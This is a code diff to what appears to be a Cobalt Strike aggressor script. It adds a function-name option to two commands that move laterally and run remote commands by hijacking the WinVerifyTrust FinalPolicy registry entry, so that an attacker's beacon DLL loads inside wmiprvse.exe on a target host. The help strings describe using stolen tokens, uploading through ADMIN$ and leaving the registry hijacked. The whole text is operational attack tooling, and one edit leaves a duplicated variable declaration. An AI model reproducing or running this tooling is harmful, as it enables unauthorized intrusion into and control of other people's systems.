@@ -235,13 +235,14 @@ beacon_command_register(
 # Operator must supply the beacon DLL.
 
 sub sipexec_jump_invoke {
-    local('$bid $target $dll_path $share $guid $no_cleanup $args $bof_data $handle');
+    local('$bid $target $dll_path $share $guid $no_cleanup $func $args $bof_data $handle');
     $bid = $1;
     $target = $2;
     $dll_path = $3;
     $share = $4;
     $guid = $5;
     $no_cleanup = $6;
+    $func = $7;
 
     if ($dll_path eq "") {
         berror($bid, "DLL path is required for jump sipexec");
@@ -264,8 +265,8 @@ sub sipexec_jump_invoke {
 
     btask($bid, "SIPExec jump → $target via FinalPolicy hijack", "T1553.003");
 
-    # Pack: mode(s) target(z) command(z) dll_data(b) dll_path_override(z) share(z) guid(z) no_cleanup(s)
-    $args = bof_pack($bid, "szzbzzzs",
+    # Pack: mode(s) target(z) command(z) dll_data(b) dll_path_override(z) share(z) guid(z) func(z) no_cleanup(s)
+    $args = bof_pack($bid, "szzbzzzzs",
         0,                   # mode = jump
         $target,             # target
         "",                  # command (empty for jump)
@@ -273,6 +274,7 @@ sub sipexec_jump_invoke {
         "",                  # dll_path_override (empty = upload)
         $share,              # share
         $guid,               # guid alias
+        $func,               # function name
         $no_cleanup          # no_cleanup
     );
 
@@ -280,11 +282,12 @@ sub sipexec_jump_invoke {
 }
 
 alias tmb_sipexec_jump {
-    local('$target $dll $share $guid $no_cleanup $i');
+    local('$target $dll $share $guid $func $no_cleanup $i');
     $target = "";
     $dll = "";
     $share = "ADMIN\$";
     $guid = "default";
+    $func = "";
     $no_cleanup = 0;
 
     for ($i = 1; $i < size(@_); $i++) {
@@ -293,23 +296,25 @@ alias tmb_sipexec_jump {
         else if (@_[$i] eq "-s" && ($i + 1) < size(@_)) { $i++; $share = @_[$i]; }
         else if (@_[$i] eq "--guid" && ($i + 1) < size(@_)) { $i++; $guid = @_[$i]; }
         else if (@_[$i] eq "-g" && ($i + 1) < size(@_)) { $i++; $guid = @_[$i]; }
+        else if (@_[$i] eq "--func" && ($i + 1) < size(@_)) { $i++; $func = @_[$i]; }
+        else if (@_[$i] eq "-f" && ($i + 1) < size(@_)) { $i++; $func = @_[$i]; }
         else if (@_[$i] eq "--no-cleanup") { $no_cleanup = 1; }
         else if ($target eq "") { $target = @_[$i]; }
         else if ($dll eq "") { $dll = @_[$i]; }
     }
 
     if ($target eq "" || $dll eq "") {
-        berror($1, "Usage: tmb_sipexec_jump <target> <dll_path> [--share ADMIN\$] [--guid default] [--no-cleanup]");
+        berror($1, "Usage: tmb_sipexec_jump <target> <dll_path> [--share ADMIN\$] [--guid default] [--func SoftpubAuthenticode] [--no-cleanup]");
         return;
     }
 
-    sipexec_jump_invoke($1, $target, $dll, $share, $guid, $no_cleanup);
+    sipexec_jump_invoke($1, $target, $dll, $share, $guid, $no_cleanup, $func);
 }
 
 beacon_command_register(
     "tmb_sipexec_jump",
     "Lateral movement via WinVerifyTrust FinalPolicy hijack (DLL loads in wmiprvse.exe)",
-    "Usage: tmb_sipexec_jump <target> <dll_path> [options]\n\n  <target>       Hostname or IP\n  <dll_path>     Path to beacon/agent DLL (x64)\n  --share, -s    Upload share (default: ADMIN\$)\n  --guid, -g     FinalPolicy GUID: default, driver, https, or raw {GUID}\n  --no-cleanup   Leave registry hijacked + DLL on disk\n\nRequires admin on target. Uses current token (make_token/steal_token first).\nDLL loads inside wmiprvse.exe — no new process created.\n\nMITRE: T1553.003 + T1047"
+    "Usage: tmb_sipexec_jump <target> <dll_path> [options]\n\n  <target>       Hostname or IP\n  <dll_path>     Path to beacon/agent DLL (x64)\n  --share, -s    Upload share (default: ADMIN\$)\n  --guid, -g     FinalPolicy GUID: default, driver, https, or raw {GUID}\n  --func, -f     $Function name (default: SoftpubAuthenticode)\n  --no-cleanup   Leave registry hijacked + DLL on disk\n\nRequires admin on target. Uses current token (make_token/steal_token first).\nDLL loads inside wmiprvse.exe -- no new process created.\n\nMITRE: T1553.003 + T1047"
 );
 
 # Also register as a jump module for CS lateral movement GUI
@@ -322,9 +327,13 @@ alias tmb_sipexec_exec {
     local('$target $command $dll $share $guid $no_cleanup $dll_path_override $i');
     $target = "";
     $command = "";
+    local('$target $command $dll $share $guid $func $no_cleanup $dll_path_override $i');
+    $target = "";
+    $command = "";
     $dll = "";
     $share = "ADMIN\$";
     $guid = "default";
+    $func = "";
     $no_cleanup = 0;
     $dll_path_override = "";
 
@@ -335,6 +344,8 @@ alias tmb_sipexec_exec {
         else if (@_[$i] eq "-s" && ($i + 1) < size(@_)) { $i++; $share = @_[$i]; }
         else if (@_[$i] eq "--guid" && ($i + 1) < size(@_)) { $i++; $guid = @_[$i]; }
         else if (@_[$i] eq "-g" && ($i + 1) < size(@_)) { $i++; $guid = @_[$i]; }
+        else if (@_[$i] eq "--func" && ($i + 1) < size(@_)) { $i++; $func = @_[$i]; }
+        else if (@_[$i] eq "-f" && ($i + 1) < size(@_)) { $i++; $func = @_[$i]; }
         else if (@_[$i] eq "--no-cleanup") { $no_cleanup = 1; }
         else if ($target eq "") { $target = @_[$i]; }
         else { $command = $command . @_[$i] . " "; }
@@ -343,15 +354,15 @@ alias tmb_sipexec_exec {
     $command = trim($command);
 
     if ($target eq "" || $command eq "") {
-        berror($1, "Usage: tmb_sipexec_exec <target> <command> [--dll path] [--unc \\\\host\\share\\payload.dll] [--share ADMIN\$] [--guid default] [--no-cleanup]");
+        berror($1, "Usage: tmb_sipexec_exec <target> <command> [--dll path] [--unc path] [--share ADMIN\$] [--guid default] [--func SoftpubAuthenticode] [--no-cleanup]");
         return;
     }
 
     # If UNC override provided, no upload needed
     if ($dll_path_override ne "") {
-        btask($1, "SIPExec exec → $target (UNC: $dll_path_override)", "T1553.003");
+        btask($1, "SIPExec exec -> $target (UNC: $dll_path_override)", "T1553.003");
         local('$args');
-        $args = bof_pack($1, "szzbzzzs",
+        $args = bof_pack($1, "szzbzzzzs",
             1,                      # mode = exec
             $target,
             $command,
@@ -359,6 +370,7 @@ alias tmb_sipexec_exec {
             $dll_path_override,     # dll_path_override
             $share,
             $guid,
+            $func,
             $no_cleanup
         );
         tmb_exec("tmb_sipexec", $1, $args);
@@ -386,9 +398,9 @@ alias tmb_sipexec_exec {
         return;
     }
 
-    btask($1, "SIPExec exec → $target : $command", "T1553.003");
+    btask($1, "SIPExec exec -> $target : $command", "T1553.003");
 
-    $args = bof_pack($1, "szzbzzzs",
+    $args = bof_pack($1, "szzbzzzzs",
         1,                   # mode = exec
         $target,
         $command,
@@ -396,6 +408,7 @@ alias tmb_sipexec_exec {
         "",                  # dll_path_override (empty = upload)
         $share,
         $guid,
+        $func,
         $no_cleanup
     );
 
@@ -405,5 +418,5 @@ alias tmb_sipexec_exec {
 beacon_command_register(
     "tmb_sipexec_exec",
     "Remote command execution via WinVerifyTrust FinalPolicy hijack + named pipe",
-    "Usage: tmb_sipexec_exec <target> <command> [options]\n\n  <target>       Hostname or IP\n  <command>      Command to execute (runs as admin via pipe impersonation)\n  --dll          Custom payload DLL (default: bundled sipexec_payload_impersonate.dll)\n  --unc          Use existing UNC path instead of uploading (fileless on target)\n  --share, -s    Upload share (default: ADMIN\$)\n  --guid, -g     FinalPolicy GUID: default, driver, https, or raw {GUID}\n  --no-cleanup   Leave registry hijacked + DLL on disk\n\nRequires admin on target. Uses current token.\nOutput returns via named pipe inside wmiprvse.exe.\n\nMITRE: T1553.003 + T1047"
+    "Usage: tmb_sipexec_exec <target> <command> [options]\n\n  <target>       Hostname or IP\n  <command>      Command to execute (runs as admin via pipe impersonation)\n  --dll          Custom payload DLL (default: bundled sipexec_payload_impersonate.dll)\n  --unc          Use existing UNC path instead of uploading (fileless on target)\n  --share, -s    Upload share (default: ADMIN\$)\n  --guid, -g     FinalPolicy GUID: default, driver, https, or raw {GUID}\n  --func, -f     $Function name (default: SoftpubAuthenticode)\n  --no-cleanup   Leave registry hijacked + DLL on disk\n\nRequires admin on target. Uses current token.\nOutput returns via named pipe inside wmiprvse.exe.\n\nMITRE: T1553.003 + T1047"
 );
